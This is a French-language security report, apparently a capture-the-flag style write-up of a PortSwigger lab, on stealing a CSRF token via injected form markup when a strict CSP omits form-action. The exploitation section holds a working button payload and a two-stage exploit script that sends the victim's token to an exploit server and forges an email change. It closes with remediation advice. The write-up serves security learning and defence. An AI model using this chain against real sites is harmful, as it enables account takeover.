@@ -1,0 +1,247 @@
+% =====================================================================
+%  Rapport de sécurité - Reflected XSS behind a strict CSP
+%  Compilation : latexmk -pdf strict-csp-dangling-markup.tex
+% =====================================================================
+\documentclass[11pt,a4paper]{article}
+\input{../../templates/preambule.tex}
+
+\begin{document}
+
+\makecover
+  {Reflected XSS behind a strict CSP}
+  {CWE-79 \textperiodcentered{} OWASP A03\string:2021}
+  {
+    \metarow{Lab}{Reflected XSS protected by very strict CSP, with dangling markup attack}
+    \metarow{Classe}{Cross-Site Scripting}
+    \metarow{Difficulté}{Practitioner}
+    \metarow{Cible}{Côté client (DOM du navigateur), Content-Security-Policy}
+    \metarow{Plateforme}{PortSwigger Web Security Academy}
+  }
+  {Lucas Fagioli}
+  {22 juin 2026}
+
+% =====================================================================
+\section{Contexte}
+% =====================================================================
+La page "My account" reflète la valeur du paramètre d'URL
+\texttt{email} directement dans l'attribut \texttt{value} du formulaire de
+changement d'adresse : un point d'injection XSS d'école. La difficulté vient
+d'une Content-Security-Policy très stricte : elle n'autorise scripts et images
+que depuis \texttt{'self'}, si bien qu'une charge \lstinline|<script>|
+classique ne s'exécute jamais et qu'une balise \lstinline|<img src=//attaquant>|
+est bloquée.
+
+Injecter du balisage reste possible même quand exécuter du script ne l'est pas.
+La CSP définit \texttt{script-src}, \texttt{img-src}, \texttt{object-src} et
+\texttt{base-uri}, mais elle oublie la directive \texttt{form-action}. Cet oubli
+permet à du balisage injecté de détourner la destination du formulaire existant,
+ce qui suffit à voler le jeton anti-CSRF d'une victime et à changer son adresse
+e-mail, sans qu'aucun JavaScript ne s'exécute sur la page cible.
+
+\begin{itemize}
+  \item \textbf{Point d'injection} : le paramètre \texttt{email} sur \texttt{/my-account}.
+  \item \textbf{Défense en place} : CSP stricte, mais sans \texttt{form-action}.
+  \item \textbf{Valeur à voler} : le jeton CSRF de la victime (champ caché du formulaire).
+  \item \textbf{Objectif} : exfiltrer le jeton CSRF via un contrôle de formulaire injecté, puis l'utiliser pour changer l'adresse e-mail de la victime.
+\end{itemize}
+
+\subsection{Environnement}
+\renewcommand{\arraystretch}{1.3}
+\begin{tabular}{@{}p{0.30\textwidth}p{0.62\textwidth}@{}}
+  \textbf{Système}         & Windows 11 \\
+  \textbf{Outil principal} & Burp Suite Community Edition \\
+  \textbf{Navigateur}      & Chromium intégré à Burp (Open Browser) \\
+  \textbf{Serveur d'exploit} & Exploit server PortSwigger (héberge la page, journal d'accès) \\
+  \textbf{Cible}           & Instance de lab PortSwigger, \texttt{*.web-security-academy.net} \\
+\end{tabular}
+
+\shot{01-lab-not-solved.png}{État initial du lab, non résolu.}
+
+On se connecte à la cible avec les identifiants fournis (\texttt{wiener} /
+\texttt{peter}).
+
+\shot{02-login.png}{Connexion en tant que wiener.}
+
+Sur la page "My account", l'adresse e-mail se modifie via un formulaire
+qui poste vers \texttt{/my-account/change-email} et porte un jeton CSRF caché :
+c'est cette valeur que l'on volera à la victime.
+
+\shot{03-account-page.png}{Page "My account" avec le formulaire de changement d'e-mail.}
+
+% =====================================================================
+\section{Reconnaissance}
+% =====================================================================
+
+\subsection{Trouver la réflexion}
+En visitant \lstinline|/my-account?email=test"><h1>canary</h1>|, on constate
+que le paramètre est reflété dans le formulaire. Le \lstinline|">| ferme
+l'attribut \texttt{value} et le \lstinline|<h1>| atterrit dans la page comme du
+vrai balisage, ce qui confirme une injection en contexte HTML.
+
+\shot{04-canary-url.png}{Charge témoin (canary) dans l'URL.}
+
+Dans Burp, la réponse le confirme : le balisage injecté sort du
+\texttt{value="..."} du champ e-mail, et le champ caché \texttt{csrf} se trouve
+juste après, dans le même \texttt{<form>}.
+
+\begin{lstlisting}
+<input required type="email" name="email" value="test"><h1>canary</h1>">
+<input required type="hidden" name="csrf" value="TWOX2lPe1ZCXgFENuKavnX4yXw3kD9AK">
+<button class='button' type='submit'> Update email </button>
+\end{lstlisting}
+
+\subsection{Lire la CSP}
+La même réponse porte la politique qui bloque la voie facile :
+
+\begin{lstlisting}
+Content-Security-Policy: default-src 'self'; object-src 'none'; style-src 'self';
+                         script-src 'self'; img-src 'self'; base-uri 'none';
+\end{lstlisting}
+
+\texttt{script-src 'self'} tue les scripts inline et externes ;
+\texttt{img-src 'self'} tue les balises image utilisées comme mouchard.
+Surtout, il n'y a pas de \texttt{form-action} : un formulaire peut donc poster
+vers n'importe quelle origine, y compris un serveur contrôlé par l'attaquant.
+
+\shot{05-reflection-and-csp.png}{Canary reflété et en-tête CSP stricte dans Burp.}
+
+% =====================================================================
+\section{Exploitation}
+% =====================================================================
+
+\subsection{L'idée : contourner la CSP par form-action}
+Puisque le jeton CSRF vit dans un champ caché du formulaire, et que la
+destination du formulaire n'est pas contrainte par \texttt{form-action}, on
+sort de l'attribut \texttt{email} pour injecter un bouton dont le
+\texttt{formaction} pointe vers notre serveur d'exploit et dont le
+\texttt{formmethod} est \texttt{get}. Le bouton fait partie du formulaire
+d'origine : le soumettre envoie tous les champs, jeton CSRF compris, dans la
+chaîne de requête, sans le moindre JavaScript.
+
+\begin{lstlisting}
+foo@bar.com"><button formaction="https://<exploit>.exploit-server.net/exploit"
+formmethod="get">Click me</button>
+\end{lstlisting}
+
+Charger cette URL sur la cible affiche le bouton "Click me" injecté dans
+le formulaire du compte.
+
+\shot{06-injected-button.png}{Bouton "Click me" injecté sur la cible.}
+
+Deux détails font la différence entre une charge qui a l'air correcte et une
+qui se déclenche vraiment : l'e-mail doit être valide. Le champ est
+\lstinline|<input required type="email">| ; une valeur comme \texttt{test}
+échoue à la validation HTML5 et le navigateur refuse silencieusement de
+soumettre. Commencer la charge par \texttt{foo@bar.com} rend le champ valide
+pour que la soumission passe. C'est précisément pour cela qu'une première
+livraison n'avait rien capturé : la victime avait "cliqué", mais le
+navigateur bloquait le formulaire invalide.
+
+\subsection{Automatiser les deux étapes sur le serveur d'exploit}
+Une seule page hébergée sur \texttt{/exploit} gère les deux étapes. Sans
+paramètre \texttt{csrf}, elle redirige la victime vers la page vulnérable
+portant la charge du bouton ; une fois le bouton soumis en retour avec
+\texttt{?csrf=...}, la même page construit un formulaire POST vers le point de
+changement d'e-mail, avec le jeton volé, et le soumet automatiquement.
+
+\begin{lstlisting}[language=HTML]
+<body>
+<script>
+const lab = 'https://<lab-id>.web-security-academy.net/';
+const exploit = 'https://<exploit>.exploit-server.net/exploit';
+const params = new URLSearchParams(location.search);
+
+if (params.has('csrf')) {
+    // Etape 2 : on a le jeton de la victime -> on forge le changement d'e-mail
+    const f = document.createElement('form');
+    f.method = 'POST';
+    f.action = lab + 'my-account/change-email';
+    f.innerHTML =
+         '<input name="csrf" value="' + params.get('csrf') + '">' +
+         '<input name="email" value="hacker@evil-user.net">';
+    document.documentElement.appendChild(f);
+    f.submit();
+} else {
+    // Etape 1 : on envoie la victime sur la page vulnerable avec le bouton injecte
+    location = lab + 'my-account?email=' + encodeURIComponent(
+         'foo@bar.com"><button formaction="' + exploit + '" formmethod="get">Click me</button>'
+    );
+}
+</script>
+</body>
+\end{lstlisting}
+
+\shot{07-exploit-server-script.png}{Serveur d'exploit hébergeant le script en deux étapes.}
+
+Le script doit s'exécuter après l'existence d'un \texttt{body}, et ajouter au
+\texttt{documentElement}. Une première version, sans \texttt{<body>} et
+appelant \texttt{document.body.appendChild(...)}, s'exécutait pendant l'analyse
+de l'en-tête : \texttt{document.body} valait \texttt{null}, le formulaire
+n'était jamais construit et le POST ne partait pas (la page restait blanche).
+Envelopper le script dans \texttt{<body>} et ajouter à
+\texttt{document.documentElement} corrige cela ; c'était la raison pour
+laquelle la victime rebouclait plusieurs fois sur \texttt{/exploit?csrf=...}
+sans que l'e-mail ne change jamais.
+
+Après soumission du bouton, le champ e-mail contient simplement
+\texttt{foo@bar.com} ; le champ précieux est le jeton CSRF qui l'accompagne.
+
+\shot{08-injected-email-field.png}{Champ e-mail portant la valeur injectée.}
+
+\subsection{Livrer à la victime et capturer le jeton}
+Cliquer sur "Deliver exploit to victim" joue la chaîne contre
+l'utilisateur simulé. Le journal d'accès du serveur d'exploit montre la victime
+récupérant \texttt{/exploit/}, puis renvoyant le jeton dans la chaîne de
+requête :
+
+\begin{lstlisting}
+10.0.4.213 "GET /exploit/"                                             200 (Victim)
+10.0.4.213 "GET /exploit?email=foo%40bar.com&csrf=WZtQLUZaMfTg0A5HawYiQiznBFJsejcX" 200 (Victim)
+\end{lstlisting}
+
+Le jeton CSRF de la victime (\texttt{WZtQ...}, différent du mien,
+\texttt{TWOX...}) a été exfiltré, et l'étape 2 le rejoue aussitôt en POST pour
+changer l'adresse e-mail.
+
+\shot{09-token-captured.png}{Jeton CSRF de la victime capturé dans le journal d'accès.}
+
+\subsection{Résolution du lab}
+L'adresse de la victime ayant été changée avec son propre jeton volé, le lab
+passe à l'état résolu.
+
+\shot{10-lab-solved.png}{Lab résolu.}
+
+% =====================================================================
+\section{Impact}
+% =====================================================================
+Une CSP stricte relève la barre mais n'est pas une solution miracle. Un
+attaquant capable d'injecter du balisage peut toujours voler des données
+sensibles présentes dans la page (jetons CSRF, secrets, valeurs partielles de
+formulaire) en détournant un formulaire existant lorsque \texttt{form-action}
+manque, et cela sans aucune exécution de script. Ici, cela mène à forger pour
+le compte de la victime une action protégée par CSRF (prise de contrôle de
+l'e-mail, marchepied classique vers la prise de contrôle du compte). L'attaque
+exige que la victime suive un lien préparé, mais ne demande aucun privilège du
+côté de l'attaquant.
+
+Gravité indicative : \textbf{élevée}.
+
+% =====================================================================
+\section{Remédiation}
+% =====================================================================
+La cause racine est du balisage attaquant émis tel quel dans la page.
+
+\begin{itemize}
+  \item \textbf{Correctif principal} : encoder en sortie toute donnée reflétée selon son contexte, pour que du balisage contrôlé par l'attaquant ne puisse jamais être émis dans la page. La valeur \texttt{email} doit être encodée pour un contexte d'attribut HTML.
+  \item \textbf{Ne pas se reposer sur la seule CSP} : la CSP atténue l'exécution de script mais n'empêche pas le vol de données par détournement de formulaire ; c'est une défense en profondeur, pas un correctif.
+  \item \textbf{Combler la faille de politique} : définir une directive \texttt{form-action} restrictive (et revoir \texttt{base-uri}, déjà verrouillée ici) pour que les formulaires ne puissent pas poster vers des origines arbitraires.
+  \item \textbf{Protéger le secret} : cantonner et faire tourner les jetons CSRF ; éviter de rendre des secrets là où une injection de balisage peut les capturer.
+  \item \textbf{Échappement automatique du framework} : préférer un moteur de gabarits qui échappe par défaut.
+\end{itemize}
+
+\vspace{4pt}
+\noindent\emph{Référence} : OWASP XSS Prevention Cheat Sheet ; PortSwigger
+"Dangling markup injection" et "Content Security Policy" ;
+CWE-79.
+
+\end{document}
